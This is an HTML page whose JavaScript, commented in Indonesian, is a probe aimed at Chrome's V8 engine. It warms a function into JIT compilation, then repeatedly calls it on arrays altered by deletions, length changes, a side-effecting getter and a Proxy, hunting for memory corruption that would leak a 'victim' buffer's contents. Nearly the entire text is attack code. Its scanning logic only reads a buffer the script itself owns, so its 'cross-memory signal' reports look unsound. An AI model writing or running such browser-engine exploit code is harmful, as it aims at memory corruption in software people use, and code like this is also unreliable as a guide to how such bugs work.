<!doctype html>
<meta charset="utf-8">
<title>V8 Cross Memory Probe</title>

<pre id="log"></pre>
<script>
const log = m => {
  document.getElementById("log").textContent += m + "\n";
  console.log(m);
};

function vuln(a,i){ return a[i] + 1.1; }

// ===== WARMUP =====
function warmup(){
  let arr = Array.from({length:30}, (_,i)=>i+0.5);
  for(let i=0;i<70000;i++) vuln(arr, i%30);
  return arr;
}

// ===== VICTIM MEMORY =====
let victim = new ArrayBuffer(0x200);
let victimF64 = new Float64Array(victim);

// isi pattern unik
for(let i=0;i<victimF64.length;i++){
  victimF64[i] = 1337.1337 + i;
}

// ===== OBSERVER MEMORY =====
let buf = new ArrayBuffer(0x4000);
let f64 = new Float64Array(buf);

// baseline
for(let i=0;i<f64.length;i++){
  f64[i] = 9999 + i;
}

// ===== MUTATION =====
function mutate(arr){
  delete arr[0];
  delete arr[1];

  arr.length = 10;
  arr[50] = 13.37;

  arr[2] = {x:1};

  let c = 0;
  Object.defineProperty(arr,3,{
    get(){
      if(c++ < 2){
        arr.push(88.88 + c);
      }
      return 1.1;
    }
  });

  return arr;
}

// ===== PROXY =====
function breakAssumption(a){
  return new Proxy(a,{
    get(t,p){
      if(p==="length"){
        t[40] = 77.77;
      }
      return Reflect.get(t,p);
    }
  });
}

// ===== SCAN =====
function scan(){
  for(let i=0;i<200;i++){
    let v = f64[i];

    // kalau beda dari baseline
    if(v !== 9999 + i){
      log("[MEM DIFF] idx="+i+" val="+v);

      // kalau mirip victim pattern
      if(Math.abs(v - 1337.1337) < 200){
        log("[🔥 CROSS-MEMORY SIGNAL] "+v);
        return true;
      }
    }
  }
  return false;
}

// ===== MAIN =====
function run(){
  log("[*] warmup");
  let base = warmup();

  log("[*] probing...");

  for(let i=0;i<30000;i++){
    let arr = [...base];
    arr = mutate(arr);
    arr = breakAssumption(arr);

    vuln(arr,5);

    if(scan()){
      log("[!!! STRONG SIGNAL DETECTED !!!]");
      return;
    }

    if(i % 2000 === 0) log("iter "+i);
  }

  log("[*] done (no cross-memory)");
}

run();
</script>
